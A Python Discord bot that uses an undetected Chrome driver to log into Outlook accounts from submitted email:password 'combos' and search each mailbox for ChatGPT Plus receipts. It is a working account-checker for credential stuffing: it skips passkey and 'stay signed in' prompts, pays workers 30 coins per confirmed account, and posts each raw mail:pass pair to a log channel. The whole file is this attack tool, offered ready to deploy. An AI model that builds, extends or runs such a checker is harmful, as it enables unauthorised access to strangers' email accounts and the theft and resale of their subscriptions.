import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import random
import string
import json
import os
import re
import discord
from discord.ext import commands
import asyncio
import traceback
import http.server
import socketserver
import threading
import ssl
import urllib.request

# --- CONFIG ---
URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=85af84fb-4838-c204-f618-76e540231109&response_mode=fragment&client_info=1&prompt=select_account&nonce=019e35f5-4ebc-7f28-8e36-611bb37f46ef&state=eyJpZCI6IjAxOWUzNWY1LTRlYmItNzdmZS04MzkwLTVlMmMzZTFhN2FiMiIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvP2N1bHR1cmU9ZW4tdXMmY291bnRyeT11Uw&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=4.28.2&response_type=code&code_challenge=Y-gIvtWec47bQ-tJO49QiNIoRYFseu5HdBprFFN3Af0&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob,flname,wld&sso_reload=true"

MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT_CHECKS", "2"))
bot_semaphore = asyncio.Semaphore(MAX_CONCURRENT)

active_checks = 0
active_checks_lock = threading.Lock()
db_write_lock = threading.Lock()

# --- ACCESS CONTROL SYSTEM ---
OWNER_ID = 1251196053349208077
ALLOWED_USERS_FILE = "allowed_users.json"

def load_allowed_users():
    if not os.path.exists(ALLOWED_USERS_FILE):
        with open(ALLOWED_USERS_FILE, "w") as f:
            json.dump([], f)
        return []
    try:
        with open(ALLOWED_USERS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return []

def save_allowed_users(users_list):
    try:
        with open(ALLOWED_USERS_FILE, "w") as f:
            json.dump(users_list, f)
    except Exception as e:
        print(f"Failed to save allowed users list: {e}")

def is_authorized(user_id):
    if user_id == OWNER_ID:
        return True
    allowed = load_allowed_users()
    return user_id in allowed

# --- HEADLESS CHROMEDRIVER OPTIONS FACTORY ---
def get_chrome_options():
    options = uc.ChromeOptions()
    options.add_argument("--start-maximized")
    is_cloud = os.getenv("DOCKER_ENV") == "true" or os.name != 'nt'
    if is_cloud:
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disable-default-apps")
        options.add_argument("--no-first-run")
        options.add_argument("--no-service-autorun")
        options.add_argument("--password-store=basic")
        options.add_argument("--use-gl=swiftshader")
        options.add_argument("--blink-settings=imagesEnabled=false")
        options.add_argument("--js-flags=--max-old-space-size=256")
        options.add_argument("--no-zygote")
        options.add_argument("--disable-renderer-backgrounding")
    return options

import gc

def cleanup_chrome_processes():
    # Force Python to release memory immediately
    gc.collect()

    is_cloud = os.getenv("DOCKER_ENV") == "true" or os.name != 'nt'
    if is_cloud:
        try:
            # Force kill any dangling or zombie chromium processes owned by the user when idle
            print("[System] All active checking sessions complete. Performing aggressive Chrome cleanup...")
            os.system("pkill -9 -f chromium || true")
            os.system("pkill -9 -f chrome || true")
            os.system("pkill -9 -f chromedriver || true")
        except Exception as pe:
            print(f"Error cleaning dangling Chrome processes: {pe}")

def create_driver(options=None):
    # Try auto-detect first
    try:
        print("Initializing Chrome driver (auto-detect)...")
        fresh_options = get_chrome_options()
        return uc.Chrome(options=fresh_options)
    except Exception as e:
        err_msg = str(e)
        print(f"Auto-detect failed: {err_msg}")

        # Self-healing: Parse the version from the error message if possible
        match = re.search(r"Current browser version is (\d+)", err_msg)
        if match:
            detected_ver = int(match.group(1))
            print(f"Self-Healing: Detected Chrome version {detected_ver} from error. Retrying...")
            try:
                retry_options = get_chrome_options()
                return uc.Chrome(options=retry_options, version_main=detected_ver)
            except Exception as retry_err:
                print(f"Self-Healing retry failed for version {detected_ver}: {retry_err}")

        # On Windows, try registry lookup
        if os.name == 'nt':
            major_version = None
            try:
                import winreg
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Google\Chrome\BLBeacon")
                version, _ = winreg.QueryValueEx(reg_key, "version")
                winreg.CloseKey(reg_key)
                major_version = int(version.split(".")[0])
                print(f"Detected Chrome major version: {major_version} (HKCU)")
            except Exception:
                try:
                    import winreg
                    reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Google\Chrome\BLBeacon")
                    version, _ = winreg.QueryValueEx(reg_key, "version")
                    winreg.CloseKey(reg_key)
                    major_version = int(version.split(".")[0])
                    print(f"Detected Chrome major version: {major_version} (HKLM)")
                except Exception:
                    pass

            if major_version:
                try:
                    print(f"Initializing Chrome driver with version_main={major_version}...")
                    reg_options = get_chrome_options()
                    return uc.Chrome(options=reg_options, version_main=major_version)
                except Exception as reg_err:
                    print(f"Failed with version_main={major_version}: {reg_err}")

        # Fallback to common versions
        for ver in [148, 147, 149]:
            try:
                print(f"Initializing Chrome driver with fallback version_main={ver}...")
                fallback_options = get_chrome_options()
                return uc.Chrome(options=fallback_options, version_main=ver)
            except Exception:
                pass

        # If all else fails, try one last time to let the error propagate
        print("All Chrome driver initialization attempts failed. Trying final fallback...")
        final_options = get_chrome_options()
        return uc.Chrome(options=final_options)

# --- SELENIUM WORKER ---

def check_chatgpt_plus_in_outlook(email, password):
    options = get_chrome_options()
    driver = create_driver(options)

    wait = WebDriverWait(driver, 35)

    try:
        driver.get(URL)

        email_input = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@id='i0116'] | //input[@name='loginfmt'] | //input[@type='email']")))
        email_input.clear()
        email_input.send_keys(email)
        driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", email_input)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@id='idSIButton9'] | //input[@type='submit'] | //button[@type='submit']"))).click()

        password_input = wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@id='passwordEntry'] | //input[@id='i0118'] | //input[@name='passwd'] | //input[@type='password']")))
        password_input.clear()
        password_input.send_keys(password)
        driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", password_input)
        wait.until(EC.element_to_be_clickable((By.XPATH, "//button[@data-testid='primaryButton'] | //input[@id='idSIButton9'] | //input[@type='submit'] | //button[@type='submit']"))).click()

        time.sleep(2)
        for i in range(7):
            try:
                cancel_btns = driver.find_elements(By.XPATH, "//button[contains(text(), 'Cancel')] | //input[@id='idCancel'] | //*[@id='idCancel'] | //input[@value='Cancel'] | //*[contains(text(), 'Cancel')]")
                passkey_header = driver.find_elements(By.XPATH, "//*[contains(text(), 'Setting up your passkey') or contains(text(), 'passkey')]")
                if cancel_btns and (cancel_btns[0].is_displayed() or (passkey_header and len(passkey_header) > 0)):
                    cancel_btns[0].click()
                    time.sleep(3)
                    continue

                skip_btns = driver.find_elements(By.ID, "iShowSkip")
                if skip_btns and skip_btns[0].is_displayed():
                    skip_btns[0].click()
                    time.sleep(3)
                else:
                    skip_btns_xpath = driver.find_elements(By.XPATH, "//*[contains(@id, 'iShowSkip') or contains(text(), 'Skip for now')]")
                    if skip_btns_xpath and skip_btns_xpath[0].is_displayed():
                        skip_btns_xpath[0].click()
                        time.sleep(3)
                    else:
                        break
            except:
                break

        # Try to bypass "Stay signed in?" screen or other intermediate pages
        try:
            stay_signed_no = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//input[@id='idBtn_Back'] | //button[@data-testid='secondaryButton'] | //button[contains(text(), 'No')] | //input[@value='No']"))
            )
            stay_signed_no.click()
            print("Successfully bypassed 'Stay signed in?' screen.")
        except Exception:
            pass

        print("Outlook logged in. Searching for subscription / invoice keywords...")
        time.sleep(3)

        search_input = wait.until(EC.element_to_be_clickable((By.ID, "topSearchInput")))
        search_input.click()
        search_input.send_keys(Keys.CONTROL + "a")
        search_input.send_keys(Keys.BACKSPACE)
        search_input.send_keys("chatgpt plus")
        search_input.send_keys("\n")
        time.sleep(4)

        items = driver.find_elements(By.CSS_SELECTOR, "div[data-focusable-row='true'][role='option']")
        if items:
            for item in items[:10]:
                text = (item.text or "").lower()
                aria_label = (item.get_attribute("aria-label") or "").lower()
                combined_text = text + " " + aria_label
                if "chatgpt plus" in combined_text or "subscription" in combined_text or "receipt" in combined_text or "invoice" in combined_text or "payment" in combined_text:
                    return "Subscribed", driver

        # Secondary check
        search_input = wait.until(EC.element_to_be_clickable((By.ID, "topSearchInput")))
        search_input.click()
        search_input.send_keys(Keys.CONTROL + "a")
        search_input.send_keys(Keys.BACKSPACE)
        search_input.send_keys("openai subscription")
        search_input.send_keys("\n")
        time.sleep(4)

        items = driver.find_elements(By.CSS_SELECTOR, "div[data-focusable-row='true'][role='option']")
        if items:
            for item in items[:10]:
                text = (item.text or "").lower()
                aria_label = (item.get_attribute("aria-label") or "").lower()
                combined_text = text + " " + aria_label
                if "openai" in combined_text and ("subscription" in combined_text or "payment" in combined_text or "receipt" in combined_text or "invoice" in combined_text or "plus" in combined_text):
                    return "Subscribed", driver

        return "Not Subscribed", driver
    except Exception as e:
        print(f"Check failed: {e}")
        return f"Error: {str(e).splitlines()[0]}", driver

# --- DISCORD BOT SETUP ---
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"🤖 Bot is logged in and ready as: {bot.user}")

def parse_multiple_credentials(user_input):
    parts = user_input.strip().split()
    accounts = []
    for p in parts:
        if ":" in p:
            email, password = p.split(":", 1)
            accounts.append((email.strip(), password.strip()))
    return accounts

def extract_userid(user_input):
    match = re.search(r'\d+', user_input)
    return int(match.group(0)) if match else None

# --- PERMISSION PROTECTION WRAPPER ---
def check_authorization(ctx):
    if not is_authorized(ctx.author.id):
        raise commands.CheckFailure("❌ **Access Denied!** You do not have permission to run bot commands.")
    return True

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(str(error))
    else:
        print(f"Error executing command: {error}")

# --- USER MANAGEMENT COMMANDS (OWNER ONLY) ---

@bot.command(name="adduser")
async def adduser_command(ctx, *, user_input: str = ""):
    """Add a Discord User ID to the allowed users list (Owner Only)"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **Access Denied!** Only the bot Owner can run this command.")
        return

    target_id = extract_userid(user_input)
    if not target_id:
        await ctx.send("⚠️ **Invalid format!** Please use: `!adduser @user` or `!adduser <discorduserid>`")
        return

    allowed_list = load_allowed_users()
    if target_id in allowed_list:
        await ctx.send(f"ℹ️ User <@{target_id}> is already in the allowed list.")
        return

    allowed_list.append(target_id)
    save_allowed_users(allowed_list)
    await ctx.send(f"✅ **[Access Granted]** User <@{target_id}> (ID: `{target_id}`) has been successfully authorized to run bot commands!")

@bot.command(name="removeuser")
async def removeuser_command(ctx, *, user_input: str = ""):
    """Remove a Discord User ID from the allowed users list (Owner Only)"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **Access Denied!** Only the bot Owner can run this command.")
        return

    target_id = extract_userid(user_input)
    if not target_id:
        await ctx.send("⚠️ **Invalid format!** Please use: `!removeuser @user` or `!removeuser <discorduserid>`")
        return

    allowed_list = load_allowed_users()
    if target_id not in allowed_list:
        await ctx.send(f"⚠️ User <@{target_id}> is not in the allowed list.")
        return

    allowed_list.remove(target_id)
    save_allowed_users(allowed_list)
    await ctx.send(f"❌ **[Access Revoked]** User <@{target_id}> (ID: `{target_id}`) has been removed from authorized access.")

@bot.command(name="listusers")
async def listusers_command(ctx):
    """List all authorized Discord User IDs (Owner Only)"""
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ **Access Denied!** Only the bot Owner can run this command.")
        return

    allowed_list = load_allowed_users()
    report = []
    report.append("📋 **Authorized Discord Users List:**")
    report.append("="*40)
    report.append(f"👑 **Owner:** <@{OWNER_ID}> (ID: `{OWNER_ID}`)")

    if allowed_list:
        report.append(f"👤 **Allowed Users [{len(allowed_list)}]:**")
        for u_id in allowed_list:
            report.append(f"• <@{u_id}> (ID: `{u_id}`)")
    else:
        report.append("👤 *No extra users have been added yet.*")

    report.append("="*40)
    await ctx.send("\n".join(report))

# ================= DATABASE =================

DB_FILE = "buydb.json"

DONE_LOG_CHANNEL = 1507918067772948500


def load_db():
    with db_write_lock:
        if not os.path.exists(DB_FILE):
            default = {
                "balances": {},
                "assigned": {},
                "done_logs": {}
            }
            with open(DB_FILE, "w") as f:
                json.dump(
                    default,
                    f,
                    indent=4
                )
            return default

        try:
            with open(DB_FILE, "r") as f:
                db = json.load(f)
        except:
            db = {}

        db.setdefault("balances", {})
        db.setdefault("assigned", {})
        db.setdefault("done_logs", {})
        return db


def save_db(data):
    with db_write_lock:
        with open(DB_FILE, "w") as f:
            json.dump(
                data,
                f,
                indent=4
            )
# --- PRIMARY WORKER BOT COMMANDS (PROTECTED) ---
@bot.command()
async def done(ctx, *, data):

    db = load_db()

    uid = str(ctx.author.id)

    if ":" not in data:

        return await ctx.send(
            "❌ Invalid format\nUse: !done mail:pass"
        )

        # create assigned if missing
    if uid not in db["assigned"]:

        db["assigned"][uid] = []

    # CASE INSENSITIVE CHECK
    assigned_lower = [
        x.lower().strip()
        for x in db["assigned"].get(uid, [])
    ]

    if data.lower().strip() not in assigned_lower:

        return await ctx.send(
            "❌ This mail wasn't assigned to you"
        )

    await ctx.send(
        "🔍 Checking ChatGPT Plus..."
    )

    email, password = data.split(
        ":",
        1
    )

    async with bot_semaphore:
        # Increment active checking counter
        with active_checks_lock:
            global active_checks
            active_checks += 1

        local_driver = None
        try:
            status, local_driver = await asyncio.to_thread(
                check_chatgpt_plus_in_outlook,
                email,
                password
            )
        except Exception as e:
            print(
                f"Checker Error: {e}"
            )
            return await ctx.send(
                "❌ Checker failed"
            )
        finally:
            if local_driver:
                try:
                    local_driver.quit()
                except:
                    pass

            # Decrement active checking counter and read idle state
            with active_checks_lock:
                active_checks -= 1
                is_idle = (active_checks == 0)

            # Perform basic heap garbage collection
            gc.collect()

            # Run aggressive process sweeping only when all checking threads are idle
            if is_idle:
                cleanup_chrome_processes()

    # NOT SUBSCRIBED
    if status != "Subscribed":

        return await ctx.send(
            f"❌ ChatGPT Plus not found\nStatus: {status}"
        )

    # reload, modify, and save database safely under the lock
    with db_write_lock:
        db = load_db()

        # create balances if missing
        if uid not in db["balances"]:

            db["balances"][uid] = 0

        # ADD COINS
        db["balances"][uid] += 30

        bal = db["balances"][uid]

        # REMOVE ASSIGNED MAIL SAFELY
        for combo in db["assigned"].get(uid, []):

            if combo.lower().strip() == data.lower().strip():

                db["assigned"][uid].remove(combo)

                break

        # DONE LOGS
        username = str(ctx.author)

        if username not in db["done_logs"]:

            db["done_logs"][username] = []

        db["done_logs"][username].append(data)

        # SAVE DATABASE
        save_db(db)

    # LOG CHANNEL
    channel = bot.get_channel(
        DONE_LOG_CHANNEL
    )

    embed = discord.Embed(
        title="✅ Done Submitted",
        color=0x00ff99
    )

    embed.add_field(
        name="User",
        value=ctx.author.mention,
        inline=False
    )

    embed.add_field(
        name="Mail",
        value=data,
        inline=False
    )

    embed.add_field(
        name="Checker Status",
        value=status,
        inline=False
    )

    embed.add_field(
        name="Balance",
        value=f"{bal} coins",
        inline=False
    )

    await channel.send(embed=embed)

    # RAW COMBO LOG
    await channel.send(
        f"```{data}```"
    )

    await ctx.send(
        f"✅ ChatGPT Plus Found\n💰 Added 30 coins\nBalance: {bal}"
    )

@bot.command(name="check")
@commands.check(check_authorization)
async def check_command(ctx, *, credentials: str = ""):
    """Log in to Outlook and check one or multiple accounts for ChatGPT Plus subscription history"""
    accounts = parse_multiple_credentials(credentials)
    if not accounts:
        await ctx.send("⚠️ **Invalid format!** Please use: `!check email:password` (or list multiple separated by spaces/newlines).")
        return

    total = len(accounts)
    status_msg = await ctx.send(f"⏳ **[Outlook Check]** Starting subscription check for **{total}** account(s)...")

    subscribed_list = []
    not_subscribed_list = []
    failed_list = []

    for index, (email, password) in enumerate(accounts, 1):
        await status_msg.edit(content=f"⏳ **[Outlook Check]** Processing account **{index}/{total}**: `{email}`...")

        async with bot_semaphore:
            # Increment active checking counter
            with active_checks_lock:
                global active_checks
                active_checks += 1

            local_driver = None
            try:
                status, local_driver = await asyncio.to_thread(check_chatgpt_plus_in_outlook, email, password)
                if status == "Subscribed":
                    subscribed_list.append(email)
                elif status == "Not Subscribed":
                    not_subscribed_list.append(email)
                elif status.startswith("Error:"):
                    failed_list.append((email, status[6:]))
                else:
                    failed_list.append((email, "Unknown Status"))
            except Exception as err:
                print(f"Error checking {email}: {err}")
                failed_list.append((email, str(err).splitlines()[0]))
            finally:
                if local_driver:
                    try:
                        local_driver.quit()
                    except:
                        pass

                # Decrement active checking counter and read idle state
                with active_checks_lock:
                    active_checks -= 1
                    is_idle = (active_checks == 0)

                # Perform basic heap garbage collection
                gc.collect()

                # Run aggressive process sweeping only when all checking threads are idle
                if is_idle:
                    cleanup_chrome_processes()

    report = []
    report.append("📋 **ChatGPT Plus Verification Summary Report:**")
    report.append("="*45)

    if subscribed_list:
        report.append(f"🎉 **Subscribed (Plus active) [{len(subscribed_list)}]:**")
        for email in subscribed_list:
            report.append(f"• `{email}`")

    if not_subscribed_list:
        if len(report) > 2:
            report.append("")
        report.append(f"❌ **Not Subscribed [{len(not_subscribed_list)}]:**")
        for email in not_subscribed_list:
            report.append(f"• `{email}`")

    if failed_list:
        if len(report) > 2:
            report.append("")
        report.append(f"⚠️ **Check Failed / Errors [{len(failed_list)}]:**")
        for email, reason in failed_list:
            report.append(f"• `{email}` (Reason: *{reason}*)")

    report.append("="*45)
    report.append("✓ *All checks complete.*")

    final_report_text = "\n".join(report)
    if len(final_report_text) > 2000:
        import io
        file_data = io.BytesIO(final_report_text.encode('utf-8'))
        await ctx.send("📋 **Summary Report (Attached due to length limit):**", file=discord.File(file_data, "check_report.txt"))
    else:
        await ctx.send(final_report_text)

    try:
        await status_msg.delete()
    except:
        pass

# --- CLOUD SERVER & STAY AWAKE SLEEP PREVENTION ---

class RailwayHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/health" or self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "healthy"}).encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

def run_http_server(port):
    handler = RailwayHandler
    socketserver.TCPServer.allow_reuse_address = True
    try:
        with socketserver.TCPServer(("", port), handler) as httpd:
            print(f"🚀 Railway HTTP Server is running on port {port}...")
            httpd.serve_forever()
    except Exception as e:
        print(f"Failed to start HTTP server: {e}")

def keep_awake():
    # Wait for the server to fully boot up first
    time.sleep(30)
    app_url = os.getenv("RAILWAY_STATIC_URL") or os.getenv("APP_URL")
    if not app_url:
        print("[Self-Pinger] RAILWAY_STATIC_URL or APP_URL not set. Skipping self-pinging.")
        return

    if not app_url.startswith("http"):
        app_url = f"https://{app_url}"

    print(f"[Self-Pinger] Started! Pinging {app_url} every 10 minutes to stay awake.")

    # Ignore self-signed SSL or temporary handshake issues
    ssl_context = ssl._create_unverified_context()

    while True:
        try:
            req = urllib.request.Request(
                app_url,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
            )
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as r:
                r.read()
            print("[Self-Pinger] Ping successful! Keeping app awake.")
        except Exception as e:
            print(f"[Self-Pinger] Ping failed: {e}")
        time.sleep(600) # Ping every 10 minutes

# --- START BOT ---
if __name__ == "__main__":
    port_env = os.getenv("PORT")
    if port_env:
        port = int(port_env)
        # Start HTTP server in a daemon thread to bypass Railway health check requirements
        threading.Thread(target=run_http_server, args=(port,), daemon=True).start()
        # Start background self-pinger thread to prevent free-tier container sleep
        threading.Thread(target=keep_awake, daemon=True).start()

    token = ""
    if not token:
        print("ERROR: DISCORD_TOKEN is missing! Please set it in your .env file.")
    else:
        print("Starting Discord Bot...")
        bot.run(token)